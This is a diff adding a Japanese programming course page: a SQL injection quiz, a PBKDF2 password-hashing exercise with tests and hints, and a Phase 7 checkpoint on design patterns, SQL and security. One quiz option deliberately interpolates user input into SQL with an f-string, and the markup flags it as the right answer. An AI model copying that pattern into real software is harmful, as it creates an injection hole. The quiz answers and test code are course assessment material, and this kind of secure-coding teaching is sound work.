+<!-- Ch33 Quiz -->
+<div class="quiz" data-ch="33" data-ex="sql-injection">
+  <h4>確認テスト</h4>
+  <p>これらのうちSQLインジェクションの脆弱性はどれですか？</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false"><code>cursor.execute("SELECT * FROM tasks WHERE id = ?", (task_id,))</code></button>
+    <button class="quiz-option" data-correct="true"><code>cursor.execute(f"SELECT * FROM tasks WHERE id = {task_id}")</code></button>
+    <button class="quiz-option" data-correct="false"><code>cursor.execute("SELECT * FROM tasks WHERE id = :id", {"id": task_id})</code></button>
+    <button class="quiz-option" data-correct="false"><code>cursor.execute("SELECT * FROM tasks WHERE id = %s", (task_id,))</code></button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch33 Pyodide Exercise -->
+<div class="exercise" data-type="pyodide" data-ch="33" data-ex="password-hashing">
+  <div class="exercise-header">
+    <h4>演習：パスワードのハッシュ化</h4>
+    <span class="exercise-status"></span>
+  </div>
+  <p class="exercise-prompt"><code>hashlib</code>を使ってパスワードのハッシュ化を実装してください。SHA-256と100,000回の反復を使うPBKDF2で<code>hash_password(password, salt)</code>を完成させてください。次に、パスワードが一致する場合のみTrueを返す<code>verify_password(password, salt, expected_hash)</code>を完成させてください。異なるソルトが異なるハッシュを生成することを実証してください。</p>
+  <div class="exercise-editor">
+    <script type="text/plain" class="starter-code">
+import hashlib
+
+def hash_password(password, salt):
+    """Hash a password with the given salt using PBKDF2-SHA256.
+    Args:
+        password: str - the plaintext password
+        salt: bytes - the salt value
+    Returns:
+        bytes - the derived key (hash)
+    """
+    # TODO: use hashlib.pbkdf2_hmac with 'sha256', 100000 iterations
+    pass
+
+def verify_password(password, salt, expected_hash):
+    """Return True if password matches the expected hash."""
+    # TODO: hash the password and compare
+    pass
+    </script>
+    <script type="text/plain" class="test-code">
+# Test basic hashing
+salt1 = b"salt_value_one__"
+hash1 = hash_password("my_password", salt1)
+assert hash1 is not None, "hash_password returned None"
+assert isinstance(hash1, bytes), "hash_password should return bytes"
+assert len(hash1) == 32, f"SHA-256 produces 32 bytes, got {len(hash1)}"
+
+# Test consistency
+hash1_again = hash_password("my_password", salt1)
+assert hash1 == hash1_again, "Same password+salt must produce same hash"
+
+# Test different salts produce different hashes
+salt2 = b"different_salt!!"
+hash2 = hash_password("my_password", salt2)
+assert hash1 != hash2, "Different salts must produce different hashes"
+
+# Test different passwords produce different hashes
+hash3 = hash_password("other_password", salt1)
+assert hash1 != hash3, "Different passwords must produce different hashes"
+
+# Test verify_password
+assert verify_password("my_password", salt1, hash1) == True, "Correct password should verify"
+assert verify_password("wrong_password", salt1, hash1) == False, "Wrong password should fail"
+assert verify_password("my_password", salt2, hash1) == False, "Wrong salt should fail"
+
+print("All password hashing tests passed!")
+    </script>
+  </div>
+  <div class="exercise-controls">
+    <button class="ex-run">実行</button>
+    <button class="ex-check">確認</button>
+    <button class="ex-hint" data-level="0">ヒント</button>
+    <button class="ex-reset">リセット</button>
+  </div>
+  <div class="exercise-output"></div>
+  <div class="exercise-tests"></div>
+  <div class="exercise-hints">
+    <p class="hint"><code>hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, 100000)</code>を使ってハッシュを作成します。</p>
+    <p class="hint">verify_passwordでは、与えられたパスワードとソルトでhash_passwordを呼び出し、結果をexpected_hashと比較します。一致する場合はTrueを返します。</p>
+    <p class="hint">パスワード文字列をバイトにエンコードすることを忘れずに：<code>password.encode('utf-8')</code>。ソルトはすでにバイトです。</p>
+  </div>
+</div>
+
+</section>
+
+
+<!-- ===== Phase 7 Gate ===== -->
+<section id="gate7">
+<h2><span class="ch-label">Phase 7 Gate</span> チェックポイント &amp; TaskForgeエンジニアリング</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念</div>
+<p>Phase 8に進む前に、以下のすべてを実証する必要があります。これらは任意ではありません &mdash; スキップすると、Phase 8で前提とされる知識にギャップが生じます。</p>
+</div>
+
+<div style="overflow-x:auto">
+<table>
+<caption>Phase 7ゲート：必須スキルと実証方法</caption>
+<thead><tr><th>スキル</th><th>実証方法</th></tr></thead>
+<tbody>
+<tr><td>SOLID原則を適用する</td><td>SRPに違反しているクラスを、焦点を絞ったコンポーネントにリファクタリングします</td></tr>
+<tr><td>Strategyパターンを使用する</td><td>ビジネスロジックを変更せずにTaskForgeのストレージバックエンドを切り替えます</td></tr>
+<tr><td>複雑なSQLを書く</td><td>JOIN、ウィンドウ関数、CTEで正しい結果を生成します</td></tr>
+<tr><td>クエリを最適化する</td><td>EXPLAINの出力を読み、インデックスを追加し、N+1クエリを修正します</td></tr>
+<tr><td>トランザクションを扱う</td><td>失敗時のロールバックを実演し、分離レベルを説明します</td></tr>
+<tr><td>ネットワーキングを説明する</td><td>HTTPリクエストをDNS、TCP、TLS、アプリケーション層を通じて追跡します</td></tr>
+<tr><td>並行処理モデルを選択する</td><td>ワークロードをスレッド、非同期、またはマルチプロセスに適切にマッチさせます</td></tr>
+<tr><td>認証を実装する</td><td>パスワードをハッシュ化し、認証情報を検証し、トークンを発行します</td></tr>
+<tr><td>OWASP Top 5を防止する</td><td>コード内のSQLインジェクション、XSS、認証の不備を特定し修正します</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3>成果物：TaskForgeエンジニアリングアップグレード</h3>
+
+<p>このフェーズで学んだスキルを、1回の集中スプリントでTaskForgeに適用しましょう：</p>
+
+<ol>
+<li><strong>デザインパターン：</strong> TaskForgeをリファクタリングして、ストレージバックエンドにStrategyパターンを使用しましょう（最低2つ：SQLiteとテスト用のインメモリ）。依存性注入を適用して、TaskManagerがコンストラクタ経由でバックエンドを受け取るようにしましょう。</li>
+<li><strong>データベース最適化：</strong> TaskForgeデータベースにインデックスを追加しましょう。最も頻繁に使用する3つのクエリでEXPLAINを実行し、インデックスが使用されていることを確認しましょう。APIルートのN+1クエリを修正しましょう。</li>
+<li><strong>認証とセキュリティ：</strong> パスワードハッシュ化（PBKDF2またはbcrypt）を追加しましょう。ログイン/登録エンドポイントを作成しましょう。すべての保護されたルートにトークンベースの認証を追加しましょう。最低でも&ldquo;admin&rdquo;と&ldquo;viewer&rdquo;のロールを持つRBACを実装しましょう。すべてのSQLクエリがパラメータ化されたステートメントを使用しているか監査しましょう。</li>
+<li><strong>トランザクション：</strong> 複数ステップの操作（&ldquo;プロジェクト間のタスク移動&rdquo;など）をトランザクションでラップし、失敗時に適切にロールバックされるようにしましょう。</li>
+</ol>
+
+<div role="note" class="callout warn">
+<div class="callout-title">注意</div>
+<p>Strategyパターンを説明して基本的な実装ができない場合、またはJOINクエリを書けない、SQLインジェクションの脆弱性を特定できない場合は &mdash; 立ち止まって該当するチャプターを復習してください。これらは以降のすべての基礎となるスキルです。</p>
+</div>
+
+<h3>これであなたができること</h3>
+
+<ul>
+<li>システムを拡張可能にする確立されたデザインパターンを使ってコードを整理できます</li>
+<li>複雑で効率的なSQLクエリを書き、なぜそのようなパフォーマンスになるのかを理解できます</li>
+<li>トランザクションでデータの整合性を保護し、適切な分離レベルを選択できます</li>
+<li>DNSからHTTPレスポンスまで、インターネットの仕組みを説明できます</li>
+<li>あらゆるワークロードに適した並行処理モデルを選択し、よくあるバグを回避できます</li>
+<li>最も一般的な攻撃ベクトルに耐えるセキュアなアプリケーションを構築できます</li>
+</ul>
+
+<div role="note" class="callout info">
+<div class="callout-title">補足</div>
+<p>これで、セキュアで構造化された、データベースを活用したアプリケーションを構築できるようになりました。Phase 8ではさらに視野を広げます：数百万人のユーザーを処理するシステムをどう設計するか？分散システムはどのように一貫性を保つのか？パフォーマンスをどう測定し改善するのか？ここで学んだエンジニアリングの技術は、システムスケールで考えるための基盤です。</p>
+</div>
+
+</section>
+
+<nav class="phase-nav">
+  <a href="phase-6.html" class="phase-nav-link prev"><span class="phase-nav-label">前のフェーズ</span>&larr; Phase 6: アルゴリズム</a>
+  <a href="phase-8.html" class="phase-nav-link next"><span class="phase-nav-label">次のフェーズ</span>Phase 8: システムとスケール &rarr;</a>
+</nav>
+
+</div>
+</div>
+
+<footer>
+<p>Zero to Hero: プログラミングからマルチエージェントClaude Codeへ &middot; 2026年3月</p>
+</footer>
+
+<script src="../js/progress.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ace-builds@1.36.5/src-min-noconflict/ace.js"></script>
+<script src="../js/theme.js"></script>
+<script src="../js/sidebar.js"></script>
+<script src="../js/shared.js"></script>
+<script src="../js/ace-init.js"></script>
+<script src="../js/pyodide-runner.js"></script>
+<script src="../js/quiz.js"></script>
+<script src="../js/exercise-runner.js"></script>
+</body>
+</html>
